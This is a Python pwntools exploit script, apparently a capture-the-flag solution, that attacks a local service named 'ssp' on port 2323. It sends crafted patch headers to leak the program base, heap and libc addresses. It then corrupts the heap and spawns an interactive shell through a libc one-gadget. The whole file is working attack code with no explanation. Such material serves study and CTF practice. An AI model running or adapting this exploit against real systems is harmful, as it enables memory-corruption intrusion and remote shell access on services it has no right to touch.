#!/usr/bin/python
from pwn import *
rhost='127.0.0.1'
rport = 2323

is_local=False

r = None
if is_local:
    r = process('./ssp')
    print r.pid
    raw_input()
else:
    r = remote(rhost, rport)


def eat_main_menu():
    r.recvuntil('$ ')

def get_welcome():
    r.recvuntil('ww9210')
    r.recvuntil('$ ')

def leak_heap():
    r.sendline('%p')
    heap=int(r.recvuntil(' :invalid option.').split(' ')[0],16)
    return heap

def add_ppl(queue_type, max_queue_entries, value_size, timeout, number_of_patch, idx_to_swap):
    r.sendline('a')
    r.recvuntil('>')
    p=''
    p += p32(queue_type)
    p += p32(max_queue_entries)
    p += p32(value_size)
    p += p32(timeout)
    p += p32(number_of_patch)
    p += p32(idx_to_swap)
    r.send(p)

def swap_patch(queue_type, max_queue_entries, value_size, timeout, number_of_patch, idx_to_swap, payload):
    r.sendline('s')
    p=''
    p += p32(queue_type)
    p += p32(max_queue_entries)
    p += p32(value_size)
    p += p32(timeout)
    p += p32(number_of_patch)
    p += p32(idx_to_swap)
    r.send(p)
    r.send(payload)
    r.recvn(value_size)

def upload_patch(queue_type, max_queue_entries, value_size, timeout, number_of_patch, idx_to_swap, payload):
    r.sendline('u')
    p=''
    p += p32(queue_type)
    p += p32(max_queue_entries)
    p += p32(value_size)
    p += p32(timeout)
    p += p32(number_of_patch)
    p += p32(idx_to_swap)
    r.send(p)
    r.send(payload)

def complain(payload=cyclic(0x200)):
    r.sendline('c')
    r.recvuntil('complains')
    r.sendline('3')
    #sleep(0.1)
    r.send(payload)
    r.recvuntil('thanks for the complain, we will get back to you in a second')

def run_patch(queue_type, max_queue_entries, value_size, timeout, number_of_patch, idx_to_swap):
    r.sendline('r')     
    p=''
    p += p32(queue_type)
    p += p32(max_queue_entries)
    p += p32(value_size)
    p += p32(timeout)
    p += p32(number_of_patch)
    p += p32(idx_to_swap)
    r.send(p)

def prepare_bad_elf():
    cont='x'*0x20
    cont+=p64(0xffffffffffffff00-0x1a0)
    cont+=cyclic(0x36-len(cont))
    cont+=p16(0x100) # 0x36
    cont+=p16(1) # 0x38
    cont+=p16(0)
    cont+=p16(0) # 0x3c
    cont+=cyclic(0x100-len(cont))
    return cont

def exp():
    get_welcome()
    #heap=leak_heap()
    add_ppl(0, 0xffffffff, 0x58, 0x100, 0, 0)
    eat_main_menu()
    add_ppl(1, 1, 0x100, 0x100, 0, 0)
    eat_main_menu()

    # do leak
    cont = prepare_bad_elf()
    upload_patch(1, 0, 0x100, 0, 1, 0, cont)
    eat_main_menu()
    run_patch(1, 0, 0, 0, 1, 0)
    print r.recvuntil('Size of segment in memory:   ')
    elf_base = int(r.recvuntil('\n').strip('\n'), 10) - 2134352
    print r.recvuntil('Alignment of segment:        ')
    heap = int(r.recvuntil('\n').strip('\n'), 10)
    r.recvuntil('is not a valid patch')
    print 'elf base:', hex(elf_base) 
    print 'heap address:', hex(heap)
    cont= ''
    cont+='y'*0x20
    cont+=p64(0xffffffffffffff00-0x1a0-0x100-((heap-0x60)-(elf_base+0x2090e0)))
    cont+=cyclic(0x36-len(cont))
    cont+=p16(0x100) # 0x36
    cont+=p16(1) # 0x38
    cont+=p16(0)
    cont+=p16(0) # 0x3c
    cont+=cyclic(0x100-len(cont))
    swap_patch(1,0,0x100,0,0,0,cont)
    eat_main_menu()
    run_patch(1, 0, 0, 0, 1, 0)
    r.recvuntil('- Size of segment in memory:   ')
    libc = int(r.recvuntil('\n').strip('\n'), 10) - 0x3eba00
    print hex(libc)
    eat_main_menu()

    # do overflow
    upload_patch(0,0,0x58,0,1,0,cyclic(0x28)+p64(heap+0x438)+p64(0x0000000100000001)+p64(0x0000010000000001)+p64(0)+p64(2)+p64(heap+(0x0000556fda3b0408-0x556fda3b03a0)))
    eat_main_menu()
    complain()
    eat_main_menu()
    upload_patch(1,0,0,0,1,0,'/bin/sh\x00'+p64(libc+0x4f322)+'A'*0xf0)
    r.interactive()


if __name__ == '__main__':
    exp()

